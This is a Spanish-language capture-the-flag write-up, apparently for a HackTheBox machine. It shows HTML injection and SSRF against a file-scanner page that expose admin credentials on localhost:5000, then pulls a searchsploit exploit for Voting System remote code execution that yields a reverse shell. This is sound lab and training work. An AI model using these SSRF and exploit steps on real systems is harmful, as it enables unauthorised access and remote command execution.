## Vulnerability Assessment {-}

### Analizamos la web staging.love.htb {-}

Aqui llegamos en una pagina **Free File Scanner**. si pinchamos el menu Demo vemos un input que nos pregunta por un file url.

Vamos a ver lo que passa si le damos una url de nuestro equipo de attaquante

### Injeccion HTML y SSRF {-}

```bash
vi index.html

<h1>Hola</h1>
<marquee>Se tenso</marquee>
```

Creamos un servicio http con python

```bash
python3 -m http.server 80
```

En la web ponemos la url de nuestro equipo `http://10.10.14.8/` y vemos que la web es vulnerable a una **Injeccion HTML**.
Intentamos con una pagina php

```bash
vi index.php

<?php
    system("whoami");
?>
```

Si ahora en la web le ponemos `http://10.10.14.8/index.php` no passa nada quiere decir que esta en un contexto sanitizado.
Bueno aqui pensamos en un **SSRF** y intentamos cosas como `http://localhost/`. Esto nos muestra el panel de session que ya emos analizado,
y probamos a ver si los puertos que tenian el mensaje **Forbidden** se pueden ahora burlar. 

Intentamos el puerto 5000, `http://localhost:5000/` y effectivamente se puede ver la pagina. A demas vemos aqui las credenciales del usuario **admin**.

Nos connectamos ahora con el usuario admin en el panel de administracion y pa dentro.

### Voting System vunlerability {-}

Aqui como una vez mas vemos el voting system, mirramos si un exploit existe para este gestor de contenido

```bash
searchsploit voting system
```

Encontramos un que permitte hacer Ejecucion Remota de commandos una vez authenticados. Como no tenemos claro que version del voting system es,
intentamos utilizar el script

```bash
cd exploits
searchsploit -m php/webapps/49445.py
mv 49445.py voting-system.py
vi voting-system.py
```

Aqui vemos que el exploit nos da directamente une reverse shell.


